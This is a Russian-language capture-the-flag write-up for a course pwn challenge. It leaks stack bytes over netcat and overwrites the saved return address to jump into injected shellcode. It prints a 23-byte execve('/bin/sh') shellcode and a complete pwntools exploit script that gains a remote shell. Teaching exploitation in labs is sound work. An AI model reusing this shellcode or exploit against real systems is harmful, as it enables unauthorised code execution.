Прикольная задача, нет ни бинарника, ни иходников. Только первые 64 байта стека. Давайте зайдем к ним `nc is-course.ru 2403` и зашлем символ переноса строки. Получаем что-то. Давайте это что то отправим в чатгпт и спросим, что же это такое:

![image](/resourses/pwn5.png)

хм, возможный адрес возврата. Это то, что нам бы хотелось. Давайте возьмем шеллкод, который вызывает bin/sh (можно взять из shell exec, он размера 31, как раз влезает, но я нагуглил такой же шеллкод размером 23, его и возьмем) - \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

Давайте первые 24 байта стека трогать не будем, а вот адрес возврата перепишем на следующую ячейку, с которой будет начинаться наш шеллкод. Pwntools, я вызываю тебя!

```python
from pwn import *

def main():
    r = remote("is-course.ru", 2403)
    r.send(p64(0x007fffffffee0a)+p64(0x005555555552e0)+p64(0x007fffffffed00)+p64(0x007fffffffecf0)+b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x00")
    r.interactive()

if __name__ == '__main__':
    main()
```

Запускаем, получаем RCE. Пишем cat `flag.txt`, получаем флаг. Там действительно был адрес возврата, чатгпт умен.

Теперь для тех, кто не понял, что произошло. с 25 по 32 байт стека находится адрес возврата. Он указывает функции, что как только она дойдет до этого места, дальше нужно выполнять инструкции с адреса, который указан в этих байтах. Так вот мы подменили этот адрес на следующий адрес этого стека, в который закинули наш шеллкод, поэтому он исполнился. 